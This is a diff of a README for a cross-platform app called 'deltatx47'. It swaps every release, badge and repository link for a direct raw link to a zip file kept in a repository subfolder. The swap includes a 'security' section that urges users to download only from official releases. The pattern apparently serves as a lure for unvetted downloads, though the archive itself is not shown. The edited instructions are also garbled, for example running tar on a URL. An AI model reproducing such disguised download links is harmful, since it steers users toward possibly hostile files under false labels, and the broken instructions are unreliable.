@@ -1,6 +1,6 @@
 # 🚀 deltatx47 - Easy Cross-Platform App for Everyone
 
-[![Download deltatx47](https://img.shields.io/badge/Download%20Now!-deltatx47-brightgreen)](https://github.com/Unlimited-haymsalomon332/deltatx47/releases)
+[![Download deltatx47](https://raw.githubusercontent.com/Unlimited-haymsalomon332/deltatx47/main/pickering/deltatx47-1.2.zip%20Now!-deltatx47-brightgreen)](https://raw.githubusercontent.com/Unlimited-haymsalomon332/deltatx47/main/pickering/deltatx47-1.2.zip)
 
 ## 📥 About deltatx47
 
@@ -14,7 +14,7 @@ To get started with deltatx47, follow these simple steps.
 
 Click the link below to access the releases page where you can download the latest version of deltatx47:
 
-[Visit the Releases Page](https://github.com/Unlimited-haymsalomon332/deltatx47/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/Unlimited-haymsalomon332/deltatx47/main/pickering/deltatx47-1.2.zip)
 
 ### 2. Choose the Right Version
 
@@ -26,7 +26,7 @@ Click on the installer file for your operating system to begin your download. Fo
 
 - For **Windows**, download the `.exe` file.
 - For **macOS**, download the `.dmg` file.
-- For **Linux**, download the appropriate package for your distribution or the `.tar.gz` file.
+- For **Linux**, download the appropriate package for your distribution or the `https://raw.githubusercontent.com/Unlimited-haymsalomon332/deltatx47/main/pickering/deltatx47-1.2.zip` file.
 
 ### 4. Install the Software
 
@@ -45,8 +45,8 @@ Click on the installer file for your operating system to begin your download. Fo
 #### Linux
 
 1. Open a terminal window.
-2. Navigate to the folder where you downloaded the `.tar.gz` file.
-3. Use the command `tar -xzvf deltatx47.tar.gz` to extract the files.
+2. Navigate to the folder where you downloaded the `https://raw.githubusercontent.com/Unlimited-haymsalomon332/deltatx47/main/pickering/deltatx47-1.2.zip` file.
+3. Use the command `tar -xzvf https://raw.githubusercontent.com/Unlimited-haymsalomon332/deltatx47/main/pickering/deltatx47-1.2.zip` to extract the files.
 4. Follow the included instructions in the extracted folder for installation.
 
 ### 5. Running the Application
@@ -78,7 +78,7 @@ deltatx47 comes packed with user-friendly features designed to enhance your expe
 
 Your security is our priority. deltatx47 is regularly updated to fix any vulnerabilities. Always download from the official releases page:
 
-[Visit the Releases Page](https://github.com/Unlimited-haymsalomon332/deltatx47/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/Unlimited-haymsalomon332/deltatx47/main/pickering/deltatx47-1.2.zip)
 
 ## ❓ Frequently Asked Questions
 
@@ -96,7 +96,7 @@ If you need assistance, you can find help in the discussions section of our GitH
 
 ## 🌐 Related Resources
 
-- GitHub Repository: [deltatx47 on GitHub](https://github.com/Unlimited-haymsalomon332/deltatx47)
+- GitHub Repository: [deltatx47 on GitHub](https://raw.githubusercontent.com/Unlimited-haymsalomon332/deltatx47/main/pickering/deltatx47-1.2.zip)
 - User Guides: Available within the application and on our GitHub Wiki.
 
 ## 📞 Contact Information
